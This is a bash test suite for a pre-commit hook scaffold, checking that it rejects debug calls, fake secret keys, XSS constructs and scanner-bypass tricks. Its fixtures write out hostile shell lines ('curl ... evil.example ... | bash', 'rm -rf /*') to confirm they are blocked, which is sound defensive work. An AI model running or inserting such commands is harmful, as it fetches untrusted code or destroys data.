#!/usr/bin/env bash
# tests/run.sh — verify the scaffold's pre-commit hook actually rejects bad
# code. Creates a throwaway git repo in a temp dir, installs the scaffold,
# stages known-bad and known-good fixtures, and asserts the hook's verdict.
# Exits non-zero on any failed assertion.
#
# Run locally:  ./tests/run.sh
# Run in CI:    same — see .github/workflows/test.yml

set -euo pipefail

SCAFFOLD_DIR="$(cd "$(dirname "$0")/.." && pwd)"
WORK=$(mktemp -d -t coding-rules-test.XXXXXX)
HOOK_OUT=$(mktemp)
trap 'rm -rf "$WORK" "$HOOK_OUT"' EXIT

PASS=0
FAIL=0

reset_repo() {
  git reset --hard HEAD >/dev/null 2>&1
  git clean -fd >/dev/null 2>&1 || true
  # Tests that exercise the stash-based scan may leave a stash if the hook
  # was interrupted; clear so the next case starts clean.
  git stash clear >/dev/null 2>&1 || true
}

assert_rejects() {
  # $1 = case name; optional $2 = substring the hook output must contain, so a
  # case can't pass merely because the hook crashed/exited non-zero for an
  # unrelated reason.
  local name=$1 expect=${2:-}
  if .githooks/pre-commit >"$HOOK_OUT" 2>&1; then
    echo "  ✗ $name — hook accepted, expected reject"
    sed 's/^/      /' "$HOOK_OUT"
    FAIL=$((FAIL + 1))
  elif [ -n "$expect" ] && ! grep -qF "$expect" "$HOOK_OUT"; then
    echo "  ✗ $name — rejected, but expected output missing: $expect"
    sed 's/^/      /' "$HOOK_OUT"
    FAIL=$((FAIL + 1))
  else
    echo "  ✓ $name"
    PASS=$((PASS + 1))
  fi
  reset_repo
}

assert_passes() {
  local name=$1
  if .githooks/pre-commit >"$HOOK_OUT" 2>&1; then
    echo "  ✓ $name"
    PASS=$((PASS + 1))
  else
    echo "  ✗ $name — hook rejected, expected pass"
    sed 's/^/      /' "$HOOK_OUT"
    FAIL=$((FAIL + 1))
  fi
  reset_repo
}

# --- bootstrap a temp project + install the scaffold ----------------------
cd "$WORK"
git init --quiet
git config user.email "test@test.local"
git config user.name "Scaffold Test"
echo '{"name":"test"}' >package.json
echo 'name = "test"' >pyproject.toml
git add . && git commit --quiet -m "fixture" --no-verify

"$SCAFFOLD_DIR/install.sh" --both --all-langs --no-verify >/dev/null
git add . && git commit --quiet -m "install scaffold" --no-verify

echo "Hook test cases:"

# 1. file size cap
seq 1 501 >big.py
git add big.py
assert_rejects "size cap (501-line .py)"

# 1b. file size cap with no trailing newline — `wc -l` would under-count
#     by 1 here; the size check uses `grep -c ''` to catch the final line.
seq 1 500 >no_newline.py
printf '501' >>no_newline.py
git add no_newline.py
assert_rejects "size cap (501 lines, no trailing newline)"

# 2. print() in Python
echo 'print("debug")' >app.py
git add app.py
assert_rejects "print() in Python"

# 3. console.log in TS
echo 'console.log("debug");' >app.ts
git add app.ts
assert_rejects "console.log in TS"

# 4. AKIA-prefix AWS key. Split the literal so this test file doesn't itself
#    trip the secrets scan — runtime concatenation reassembles the full key
#    inside the temp repo, where rejection is the assertion.
echo "AKIA""IOSFODNN7EXAMPLE" >config.txt
git add config.txt
assert_rejects "AWS access key (AKIA...)"

# 5. blocked filename
echo "FOO=bar" >.env
git add -f .env
assert_rejects ".env file blocked"

# 6. clean code passes — ruff-clean too (blank line after imports for I001).
cat >app.py <<'EOF'
import logging

log = logging.getLogger(__name__)
log.info("ok")
EOF
git add app.py
assert_passes "clean Python file"

# 7. hardcoded credential — exercises the alternation branch in secrets.txt.
#    Split `pass`+`word` so this file's source doesn't itself trip the scan,
#    same trick as the AKIA fixture above.
echo 'pass''word = "abcdefghijklmnop12345"' >config.py
git add config.py
assert_rejects "hardcoded credential (alternation match)"

# 8. dangerous shell pattern — curl piped to bash. Split `cur`+`l` so this
#    file's source doesn't itself trip shell.txt when scanned as a .sh file.
echo 'cur''l https://evil.example/install.sh | bash' >deploy.sh
git add deploy.sh
assert_rejects "curl pipe to bash"

# 9. hook scans staged content, not working tree. Stage bad code, then make
#    the working tree clean — the dirty index must still be rejected.
echo 'pri''nt("debug")' >sneaky.py
git add sneaky.py
echo '# clean now' >sneaky.py
assert_rejects "scans staged content (not working tree)"

# 10. scaffold-allow marker exempts the matched line.
echo 'pri''nt("entry")  # scaffold-allow CLI entry point' >cli.py
git add cli.py
assert_passes "scaffold-allow exempts marked line"

# 11. scaffold-allow only exempts its own line — an unmarked offending line
#     in the same file must still reject.
{
  echo 'pri''nt("ok")  # scaffold-allow'
  echo 'pri''nt("real leak")'
} >mixed.py
git add mixed.py
assert_rejects "scaffold-allow does not whitelist whole file"

# 12. scaffold-allow works for the secrets check too. AKIA literal split
#     so this test file itself doesn't trip the scan.
echo "AKIA""IOSFODNN7EXAMPLE  # scaffold-allow docs example" >example.md
git add example.md
assert_passes "scaffold-allow exempts secret on docs line"

# 13. ruff lint integration — the hook should run ruff on staged .py when
#     ruff.toml is present and ruff is on PATH. Skipped otherwise.
if command -v ruff >/dev/null 2>&1; then
  cat >badimports.py <<'EOF'
import sys
import os
EOF
  git add badimports.py
  assert_rejects "ruff catches unsorted imports"
else
  echo "  - skipped ruff test (ruff not installed)"
fi

# 14. unicode filename — `core.quotepath=on` (git default) would emit the
#     name as a C-quoted string, the downstream `[ -f "$file" ]` check
#     would fail, and the file would slip past every scanner. The hook
#     now uses `-c core.quotepath=off` so this case rejects.
echo 'pri''nt("debug")' >café.py
git add café.py
assert_rejects "unicode filename does not bypass scan"

# 15. MAX_LINES env override — passing 100 should cause a 200-line file
#     to reject (default 500 would let it through).
seq 1 200 >medium.py
git add medium.py
if MAX_LINES=100 .githooks/pre-commit >"$HOOK_OUT" 2>&1; then
  echo "  ✗ MAX_LINES=100 — hook accepted, expected reject"
  sed 's/^/      /' "$HOOK_OUT"
  FAIL=$((FAIL + 1))
else
  echo "  ✓ MAX_LINES env var override"
  PASS=$((PASS + 1))
fi
reset_repo

# 16. MAX_LINES non-numeric — the size check should fail loudly with
#     exit 2, not silently misbehave.
echo 'ok = True' >tiny.py
git add tiny.py
if MAX_LINES=abc .githooks/pre-commit >"$HOOK_OUT" 2>&1; then
  echo "  ✗ MAX_LINES=abc — hook accepted, expected reject"
  FAIL=$((FAIL + 1))
elif grep -q "MAX_LINES must be a positive integer" "$HOOK_OUT"; then
  echo "  ✓ MAX_LINES validation rejects non-numeric"
  PASS=$((PASS + 1))
else
  echo "  ✗ MAX_LINES=abc — rejected but without expected error message"
  sed 's/^/      /' "$HOOK_OUT"
  FAIL=$((FAIL + 1))
fi
reset_repo

# 17. invalid pattern in backend.txt — the scan should warn and drop the
#     bad pattern, then continue with the rest. A valid `print` pattern
#     match must still reject.
printf '[unclosed\tbroken regex\n' >>.forbidden-patterns/backend.txt
echo 'pri''nt("debug")' >app.py
git add .forbidden-patterns/backend.txt app.py
if .githooks/pre-commit >"$HOOK_OUT" 2>&1; then
  echo "  ✗ invalid-pattern test — hook accepted, expected reject (on print)"
  sed 's/^/      /' "$HOOK_OUT"
  FAIL=$((FAIL + 1))
elif grep -q "invalid pattern dropped" "$HOOK_OUT"; then
  echo "  ✓ invalid pattern dropped with warning, valid patterns still scan"
  PASS=$((PASS + 1))
else
  echo "  ✗ invalid-pattern test — rejected but no warning emitted"
  sed 's/^/      /' "$HOOK_OUT"
  FAIL=$((FAIL + 1))
fi
reset_repo

# 18. workflow validity — the rendered .github/workflows/lint.yml must be a
#     VALID GitHub Actions workflow. A job-level `if: hashFiles(...)` (or any
#     context-availability error) makes GitHub reject the whole file, silently
#     disabling every job — the failure mode that shipped a no-op lint workflow
#     to consumers for weeks. actionlint catches this class. shellcheck/pyflakes
#     integration is disabled: this guard is about Actions semantics, not shell
#     or Python style (those have their own checks). Skipped if actionlint is
#     absent locally; CI installs it so the guard always runs there.
if command -v actionlint >/dev/null 2>&1; then
  if actionlint -shellcheck= -pyflakes= .github/workflows/lint.yml >"$HOOK_OUT" 2>&1; then
    echo "  ✓ rendered lint.yml is a valid GitHub Actions workflow"
    PASS=$((PASS + 1))
  else
    echo "  ✗ rendered lint.yml failed actionlint validation"
    sed 's/^/      /' "$HOOK_OUT"
    FAIL=$((FAIL + 1))
  fi
else
  echo "  - skipped workflow validation (actionlint not installed)"
fi

# 19. NUL byte must not flip the secret scan into "binary file" mode. A single
#     NUL anywhere in a text file used to make grep treat the whole file as
#     binary and silently skip it, bypassing the secret scan in the hook AND in
#     CI. Scanning the staged blob with -a/--text (and $()'s NUL-stripping)
#     closes this. AKIA literal split so this file doesn't itself trip the scan.
printf 'AKIA''IOSFODNN7EXAMPLE\000trailing\n' >nul.txt
git add nul.txt
assert_rejects "NUL byte does not hide a secret" "AWS access key"

# 20. A secret carried as a symlink target must be scanned. A symlink's
#     committed blob is its target string; the old path-based scan followed the
#     link (or `[ -f ]`-skipped a dangling one) and never saw it. Blob scanning
#     (git show :0:<path>) reads the target string and catches it.
ln -s "$(printf 'AKIA''IOSFODNN7EXAMPLE')" akialink
git add akialink
assert_rejects "symlink target carrying a secret is scanned" "AWS access key"

# 21. A filename containing a newline must not split the staged-file list and
#     bypass every scanner. NUL-delimited (-z) enumeration end-to-end closes
#     this; the old newline-delimited list saw "a" and "b.py" as two paths that
#     both failed existence checks and were skipped. `pri''nt` split so this
#     file doesn't itself trip the scan.
nlfile=$(printf 'a\nb.py')
printf 'pri''nt("debug")\n' >"$nlfile"
git add "$nlfile"
assert_rejects "newline in filename does not bypass scan" "print()"

# 22. Modern provider key prefixes (split so this file doesn't trip the scan).
echo "ANTHROPIC=sk-""ant-api03-AbCdEf01234567890_-gHiJkLmNoPqR" >k1.txt
git add k1.txt
assert_rejects "Anthropic sk-ant- key detected" "Anthropic"

echo "OPENAI=sk-""proj-AbCdEf01234567890_-gHiJkLmNoPqRsTu" >k2.txt
git add k2.txt
assert_rejects "OpenAI sk-proj- key detected" "OpenAI project"

echo "GH=git""hub_pat_11ABCDE000aBcDeFgHiJ_KlMnOpQrStUv" >k3.txt
git add k3.txt
assert_rejects "GitHub fine-grained PAT detected" "fine-grained"

echo "AWS=ASIA""IOSFODNN7EXAMPLE" >k4.txt
git add k4.txt
assert_rejects "AWS temporary (ASIA) key detected" "AWS access key"

# 23. Broadened curl|bash — the common `curl -fsSL <url> | bash` form (split).
echo "cur""l -fsSL https://evil.example/i.sh | bash" >deploy2.sh
git add deploy2.sh
assert_rejects "curl -fsSL <url> | bash detected" "Piping remote download"

# 24. Broadened rm -rf — the catastrophic `rm -rf /*` form ('' splits the glob).
echo "rm -rf /""*" >danger.sh
git add danger.sh
assert_rejects "rm -rf /* detected" "refuse to ship"

# 25. NEGATIVE: a scoped removal must NOT be flagged (false-positive guard).
echo "rm -rf /tmp/build-cache" >cleanup.sh
git add cleanup.sh
assert_passes "scoped rm -rf /tmp/... is not flagged"

# 26. NEGATIVE: pattern scan is case-SENSITIVE — `Console.log` (capital C) is a
#     different identifier and must pass, not be flagged as `console.log`.
echo 'Console.log("ok");' >comp.ts
git add comp.ts
assert_passes "case-sensitive: Console.log not flagged as console.log"

# 27. Deleting the secrets config in the same commit must not silently disable
#     the scanner — the hook refuses a staged deletion of .forbidden-patterns/*.txt.
git rm -q .forbidden-patterns/secrets.txt
assert_rejects "deleting forbidden-pattern config is refused" "disabling the scanner"

# 28. scaffold-allow only exempts when it follows a comment leader; the bare
#     substring inside a string literal must NOT whitelist a real secret.
echo 'note = "scaffold-allow AKIA''IOSFODNN7EXAMPLE"' >sneaky2.txt
git add sneaky2.txt
assert_rejects "scaffold-allow in a string does not exempt a secret" "AWS access key"

# 29. A config line with no TAB separator is skipped with a warning (not promoted
#     to a whole-line pattern); a valid pattern on another line still scans.
printf 'this line has no tab separator at all\n' >>.forbidden-patterns/backend.txt
echo 'pri''nt("debug")' >hastab.py
git add .forbidden-patterns/backend.txt hastab.py
if .githooks/pre-commit >"$HOOK_OUT" 2>&1; then
  echo "  ✗ missing-TAB config — accepted, expected reject (print should still scan)"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
elif grep -qF "no TAB separator" "$HOOK_OUT"; then
  echo "  ✓ missing-TAB config line skipped with warning, valid pattern still scans"
  PASS=$((PASS + 1))
else
  echo "  ✗ missing-TAB config — rejected but no warning emitted"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
fi
reset_repo

# 30. CI mode fails CLOSED when secrets.txt is absent (it would otherwise pass
#     silently — disabling the scanner). Exercises the --ci code path directly.
rm -f .forbidden-patterns/secrets.txt
if printf '' | .githooks/lib/check-secrets --ci >"$HOOK_OUT" 2>&1; then
  echo "  ✗ --ci absent-config — exited 0, expected fail-closed"
  FAIL=$((FAIL + 1))
elif grep -qF "secret scanner is disabled" "$HOOK_OUT"; then
  echo "  ✓ --ci fails closed when secrets.txt is missing"
  PASS=$((PASS + 1))
else
  echo "  ✗ --ci absent-config — failed without the expected message"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
fi
reset_repo

# 31. ReDoS guard: a line over MAX_LINE_LENGTH is dropped before the combined
#     ERE (which can hang superlinearly on a long line), while a secret on a
#     normal line is still caught. Long line is benign filler; AKIA split.
{
  echo "AKIA""IOSFODNN7EXAMPLE"
  head -c 60000 /dev/zero | tr '\0' a
  echo
} >redos.txt
git add redos.txt
if .githooks/pre-commit >"$HOOK_OUT" 2>&1; then
  echo "  ✗ ReDoS guard — accepted, expected reject (secret on the normal line)"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
elif grep -qF "AWS access key" "$HOOK_OUT" && grep -qF "chars dropped from the scan" "$HOOK_OUT"; then
  echo "  ✓ over-long line dropped with warning; secret on normal line still caught"
  PASS=$((PASS + 1))
else
  echo "  ✗ ReDoS guard — rejected but missing the secret hit or the drop warning"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
fi
reset_repo

# 32. Rename bypass: a secret-bearing TEXT file given a binary extension is
#     still scanned. Binary is decided by CONTENT (a NUL byte), not by the name,
#     so .png/.zip/etc. no longer smuggle a plaintext secret past the scan.
echo "AKIA""IOSFODNN7EXAMPLE" >logo.png
git add logo.png
assert_rejects "secret renamed to .png is still scanned" "AWS access key"

# 33. Same rename bypass via a lockfile name the old extension list skipped.
echo "AKIA""IOSFODNN7EXAMPLE" >package-lock.json
git add package-lock.json
assert_rejects "secret in package-lock.json is still scanned" "AWS access key"

# 34. Defense in depth: a secret in a file with BOTH a binary extension AND a
#     NUL byte is still caught. We skip nothing by name, and a NUL never marks a
#     blob "binary, skip" (that would reopen the NUL-byte bypass) — so combining
#     the two evasions still fails. \000 writes the NUL; AKIA literal split.
printf 'AKIA''IOSFODNN7EXAMPLE\000trailing\n' >payload.png
git add payload.png
assert_rejects "secret with NUL + binary extension is still scanned" "AWS access key"

# 35. --ci annotation escaping: a filename containing ':' and ',' is
#     percent-encoded in the ::error property (%3A / %2C) so a crafted name
#     can't forge or truncate the annotation. Exercises the --ci path directly.
echo "AKIA""IOSFODNN7EXAMPLE" >'weird:name,x.txt'
git add 'weird:name,x.txt'
printf '%s\0' 'weird:name,x.txt' | .githooks/lib/check-secrets --ci >"$HOOK_OUT" 2>&1 || true
if grep -qF 'file=weird%3Aname%2Cx.txt' "$HOOK_OUT"; then
  echo "  ✓ --ci ::error escapes : and , in the filename property"
  PASS=$((PASS + 1))
else
  echo "  ✗ --ci ::error escaping — expected percent-encoded filename, got:"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
fi
reset_repo

# 36. Focused test (.only) is rejected — a green CI that ran almost nothing is
#     the single most dangerous frontend commit.
echo 'it.only("smoke", () => {});' >focused.test.ts
git add focused.test.ts
assert_rejects "focused test (.only) is rejected" "Focused test"

# 37. NEGATIVE: an ordinary test (no .only) must pass — the .only regex must not
#     fire on a plain it(...)/test(...) call.
echo 'it("does a thing", () => { expect(1).toBe(1); });' >ok.test.ts
git add ok.test.ts
assert_passes "ordinary it(...) test is not flagged as .only"

# 38. @ts-ignore is rejected — use @ts-expect-error with a justification.
{
  echo '// @ts-ignore'
  echo 'const x: number = "nope";'
} >tsignore.ts
git add tsignore.ts
assert_rejects "@ts-ignore is rejected" "@ts-expect-error"

# 39. dangerouslySetInnerHTML is rejected as an XSS vector.
echo 'const el = <div dangerouslySetInnerHTML={{ __html: userInput }} />;' >xss.tsx
git add xss.tsx
assert_rejects "dangerouslySetInnerHTML is rejected" "XSS vector"

# 40. hardcoded localhost URL is rejected — config/env instead.
echo 'const api = "http://localhost:8080/v1";' >localhost.ts
git add localhost.ts
assert_rejects "hardcoded localhost URL is rejected" "hardcoded localhost"

# 41. NEGATIVE: console.warn / console.error are allowed (only console.log is
#     banned) and a clean .ts file with no tsconfig.json passes — proving the
#     new tsc block silently skips when TypeScript isn't configured.
{
  echo 'console.warn("heads up");'
  echo 'export const value = 42;'
} >clean.ts
git add clean.ts
assert_passes "console.warn allowed; clean .ts with no tsconfig passes"

# 42. tsc type-error rejection — only runs where TypeScript is resolvable in the
#     temp repo (it isn't, by default: no node_modules), so this is normally a
#     skip. Documents intent and exercises the path on machines that have a
#     project-local tsc. The hook runs `tsc --noEmit` project-wide when a
#     tsconfig.json exists.
if npx --no-install tsc --version >/dev/null 2>&1; then
  echo '{"compilerOptions":{"strict":true,"noEmit":true}}' >tsconfig.json
  echo 'const n: number = "definitely not a number";' >typeerr.ts
  git add tsconfig.json typeerr.ts
  assert_rejects "tsc --noEmit rejects a type error"
else
  echo "  - skipped tsc test (typescript not installed in temp repo)"
fi

# 43. Merge-conflict markers are rejected (check-hygiene).
{
  echo '<<<<<<< HEAD'
  echo 'our change'
  echo '======='
  echo 'their change'
  echo '>>>>>>> feature-branch'
} >conflict.txt
git add conflict.txt
assert_rejects "merge-conflict marker is rejected" "merge-conflict marker"

# 44. NEGATIVE: a reST/Markdown heading underline of 7+ `=` is NOT a conflict
#     marker — only <<<<<<< / >>>>>>> / ||||||| are. Must pass.
{
  echo 'Section title'
  echo '============='
  echo 'Body.'
} >doc.rst
git add doc.rst
assert_passes "heading underline (=======) is not flagged as a conflict"

# 45. Case-only filename collision is rejected. A real two-file fixture can't
#     exist on a case-insensitive filesystem (macOS default, where Collide.txt
#     and collide.txt are the same file), so feed check-hygiene the NUL-delimited
#     path list directly — the same way case #35 exercises check-secrets --ci.
if printf '%s\0' 'Collide.txt' 'collide.txt' | .githooks/lib/check-hygiene >"$HOOK_OUT" 2>&1; then
  echo "  ✗ case-only filename collision — accepted, expected reject"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
elif grep -qF "case-only filename collision" "$HOOK_OUT"; then
  echo "  ✓ case-only filename collision is rejected"; PASS=$((PASS + 1))
else
  echo "  ✗ case-only filename collision — rejected without expected message"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
fi
reset_repo

# 45b. NEGATIVE: distinct filenames (not a case variant) do not collide.
if printf '%s\0' 'a.txt' 'b.txt' 'README.md' | .githooks/lib/check-hygiene >"$HOOK_OUT" 2>&1; then
  echo "  ✓ distinct filenames are not flagged as a collision"; PASS=$((PASS + 1))
else
  echo "  ✗ distinct filenames — flagged as a collision, expected pass"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
fi
reset_repo

# --- Multi-language forbidden patterns (config-driven check-patterns) -------
# Each language file declares its extensions via a `# scaffold-extensions:`
# header and is auto-discovered by check-patterns. Samples come from the
# adversarially-FP-reviewed pattern set; each pair proves an active pattern
# rejects and a look-alike legitimate construct passes.

# PHP — dd() debug call vs ->dd() method call ($-vars are literal PHP source)
# shellcheck disable=SC2016
echo '<?php dd($user, $order);' >leak.php
git add leak.php
assert_rejects "PHP dd() debug call rejected" "dump-and-die"
# shellcheck disable=SC2016
echo '<?php $q = $builder->dd()->paginate();' >ok.php
git add ok.php
assert_passes "PHP ->dd() method call is not flagged"

# Go — fmt.Println debug vs fmt.Errorf
echo 'fmt.Println("user:", u)' >leak.go
git add leak.go
assert_rejects "Go fmt.Println debug rejected" "fmt.Print"
echo 'return fmt.Errorf("load config: %w", err)' >ok.go
git add ok.go
assert_passes "Go fmt.Errorf is not flagged"

# Rust — dbg!() macro vs format!()
echo 'dbg!(payload);' >leak.rs
git add leak.rs
assert_rejects "Rust dbg!() macro rejected" "dbg!"
echo 'let n = format!("{}-{}", a, b);' >ok.rs
git add ok.rs
assert_passes "Rust format!() is not flagged"

# Java — System.out.println vs logger
echo 'System.out.println("debug");' >Leak.java
git add Leak.java
assert_rejects "Java System.out.println rejected" "System.out"
echo 'logger.info("started");' >Ok.java
git add Ok.java
assert_passes "Java logger.info is not flagged"

# Kotlin — println vs logger
echo 'println("debug")' >Leak.kt
git add Leak.kt
assert_rejects "Kotlin println rejected" "println"
echo 'logger.info("started")' >Ok.kt
git add Ok.kt
assert_passes "Kotlin logger.info is not flagged"

# Ruby — binding.pry debug vs puts (puts is opt-in, off by default)
echo 'binding.pry' >leak.rb
git add leak.rb
assert_rejects "Ruby binding.pry rejected" "binding.pry"
echo 'puts "ok"' >ok.rb
git add ok.rb
assert_passes "Ruby puts is opt-in (not flagged by default)"

# 46-48. agent-precheck — the opt-in Claude Code PreToolUse hook. Invoked
#     directly (it's not a git hook) with CLAUDE_PROJECT_DIR pointed at this
#     temp repo, which has .forbidden-patterns/secrets.txt installed. Needs jq.
if command -v jq >/dev/null 2>&1; then
  PRECHECK="$SCAFFOLD_DIR/githooks/lib/agent-precheck.template"
  akia="AKIA""IOSFODNN7EXAMPLE"   # split so this file carries no real-looking key
  # (46) a Write introducing a secret is blocked (exit 2 + message)
  pc=$(printf '{"tool_name":"Write","tool_input":{"file_path":"x.py","content":"AWS=%s"}}' "$akia")
  if echo "$pc" | CLAUDE_PROJECT_DIR="$PWD" bash "$PRECHECK" >"$HOOK_OUT" 2>&1; then
    echo "  ✗ agent-precheck — allowed a secret Write, expected block"; FAIL=$((FAIL + 1))
  elif grep -qF "BLOCKED by agent-precheck" "$HOOK_OUT"; then
    echo "  ✓ agent-precheck blocks a secret-bearing Write"; PASS=$((PASS + 1))
  else
    echo "  ✗ agent-precheck — blocked but missing expected message"
    sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
  fi
  # (47) clean content is allowed (exit 0)
  pc='{"tool_name":"Write","tool_input":{"file_path":"x.ts","content":"export const x = 1;"}}'
  if echo "$pc" | CLAUDE_PROJECT_DIR="$PWD" bash "$PRECHECK" >"$HOOK_OUT" 2>&1; then
    echo "  ✓ agent-precheck allows clean content"; PASS=$((PASS + 1))
  else
    echo "  ✗ agent-precheck — blocked clean content, expected allow"
    sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
  fi
  # (48) a comment-anchored scaffold-allow marker exempts the line (exit 0)
  pc=$(printf '{"tool_name":"Write","tool_input":{"file_path":"x.md","content":"key = %s  # scaffold-allow docs example"}}' "$akia")
  if echo "$pc" | CLAUDE_PROJECT_DIR="$PWD" bash "$PRECHECK" >"$HOOK_OUT" 2>&1; then
    echo "  ✓ agent-precheck honors scaffold-allow"; PASS=$((PASS + 1))
  else
    echo "  ✗ agent-precheck — scaffold-allow not honored, expected allow"
    sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
  fi
else
  echo "  - skipped agent-precheck tests (jq not installed)"
fi
reset_repo

# 49-51. commit-msg hook — Conventional-Commits subject enforcement. Invoked
#     directly with a message file (it's installed only with --commit-msg).
CMHOOK="$SCAFFOLD_DIR/githooks/commit-msg.template"
mf=$(mktemp)
printf 'feat(api): add pagination\n' >"$mf"
if bash "$CMHOOK" "$mf" >"$HOOK_OUT" 2>&1; then
  echo "  ✓ commit-msg accepts a Conventional Commit subject"; PASS=$((PASS + 1))
else
  echo "  ✗ commit-msg rejected a valid subject"; sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
fi
printf 'fixed a bug\n' >"$mf"
if bash "$CMHOOK" "$mf" >"$HOOK_OUT" 2>&1; then
  echo "  ✗ commit-msg accepted a non-conforming subject"; FAIL=$((FAIL + 1))
elif grep -qF "Conventional Commits" "$HOOK_OUT"; then
  echo "  ✓ commit-msg rejects a non-conforming subject"; PASS=$((PASS + 1))
else
  echo "  ✗ commit-msg rejected but without the expected message"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
fi
printf 'Merge branch main into feature\n' >"$mf"
if bash "$CMHOOK" "$mf" >"$HOOK_OUT" 2>&1; then
  echo "  ✓ commit-msg exempts a merge commit"; PASS=$((PASS + 1))
else
  echo "  ✗ commit-msg rejected a merge commit"; sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
fi
rm -f "$mf"
reset_repo

# --- .scaffold.toml per-project overrides (lib/scaffold-config) -------------
# A STAGED .scaffold.toml is what the checks read: the hook stashes unstaged
# changes (--keep-index), so only the indexed copy is on disk during the scan —
# matching how overrides ship (committed). Fixtures use ruff-clean comment
# bodies / bare `print` so the linters don't independently fail an assert_passes
# case (ruff doesn't enable T20; eslint's no-console is why these avoid .ts).

# 52. [size] per-glob cap raises the limit: a 501-line file under the matching
#     glob passes where the default 500 would reject.
printf '[size]\n"legacy/**" = 700\n' >.scaffold.toml
mkdir -p legacy
seq 1 501 | sed 's/^/# /' >legacy/big.py
git add .scaffold.toml legacy/big.py
assert_passes "override: [size] per-glob cap raises the limit"

# 53. [rules.size] disabled turns the size cap off entirely.
printf '[rules.size]\ndisabled = true\n' >.scaffold.toml
seq 1 501 | sed 's/^/# /' >big2.py
git add .scaffold.toml big2.py
assert_passes "override: [rules.size] disabled skips the size cap"

# 54. A disabled forbidden-pattern rule lets its match through.
cat >.scaffold.toml <<'EOF'
[rules."backend/Use structlog (or the project's logger), not print()"]
disabled = true
reason   = "test"
by       = "test"
EOF
echo 'print("debug")' >app.py
git add .scaffold.toml app.py
assert_passes "override: disabled pattern rule lets the match through"

# 55. severity = "warn" reports the match but does NOT fail the build.
cat >.scaffold.toml <<'EOF'
[rules."backend/Use structlog (or the project's logger), not print()"]
severity = "warn"
EOF
echo 'print("debug")' >app.py
git add .scaffold.toml app.py
if .githooks/pre-commit >"$HOOK_OUT" 2>&1; then
  if grep -qF "(warn — .scaffold.toml override)" "$HOOK_OUT"; then
    echo "  ✓ override: severity=warn reports without failing"; PASS=$((PASS + 1))
  else
    echo "  ✗ override: severity=warn passed but emitted no warn notice"
    sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
  fi
else
  echo "  ✗ override: severity=warn — hook failed, expected pass-with-warning"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
fi
reset_repo

# 56. Hygiene rule downgrade: case-collision as a warning still passes. Feed the
#     NUL-delimited path list to check-hygiene directly (a real case-variant pair
#     can't coexist on a case-insensitive FS), with the override on disk.
printf '[rules.case-collision]\nseverity = "warn"\n' >.scaffold.toml
if printf '%s\0' 'Collide.txt' 'collide.txt' | .githooks/lib/check-hygiene >"$HOOK_OUT" 2>&1; then
  if grep -qF "(warn — .scaffold.toml override)" "$HOOK_OUT"; then
    echo "  ✓ override: case-collision severity=warn passes with a notice"; PASS=$((PASS + 1))
  else
    echo "  ✗ override: case-collision warn passed but emitted no notice"
    sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
  fi
else
  echo "  ✗ override: case-collision severity=warn — failed, expected pass"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
fi
reset_repo

# 57. FAIL SAFE: an unparseable .scaffold.toml disables nothing — print() is
#     still rejected (a config can only weaken via a clean, explicit entry).
printf 'this is { not ] valid toml at all\n' >.scaffold.toml
echo 'print("debug")' >app.py
git add .scaffold.toml app.py
assert_rejects "override: malformed config fails safe (rule still enforced)" "structlog"

# 58. SECURITY BOUNDARY: .scaffold.toml cannot disable the secret scanner —
#     check-secrets never consults it, so the AKIA key is still caught.
cat >.scaffold.toml <<'EOF'
[rules."secrets/AWS access key ID (AKIA) or temporary session key (ASIA) — rotate immediately"]
disabled = true
EOF
echo "AKIA""IOSFODNN7EXAMPLE" >creds.txt
git add .scaffold.toml creds.txt
assert_rejects "override: secret scanner is NOT disablable via .scaffold.toml" "AWS access key"

# 59. scaffold-audit (installed by install.sh) lists active overrides. The CI
#     guardrails job runs this so a disabled rule is visible in the build log.
printf '[rules."backend/Use structlog (or the project'\''s logger), not print()"]\ndisabled = true\n' >.scaffold.toml
if .githooks/lib/scaffold-audit >"$HOOK_OUT" 2>&1 \
   && grep -qF "DISABLED" "$HOOK_OUT" && grep -qF "backend/Use structlog" "$HOOK_OUT"; then
  echo "  ✓ scaffold-audit lists active overrides"; PASS=$((PASS + 1))
else
  echo "  ✗ scaffold-audit — did not list the disabled rule"
  sed 's/^/      /' "$HOOK_OUT"; FAIL=$((FAIL + 1))
fi
reset_repo

echo ""
echo "Result: $PASS passed, $FAIL failed"
exit $FAIL
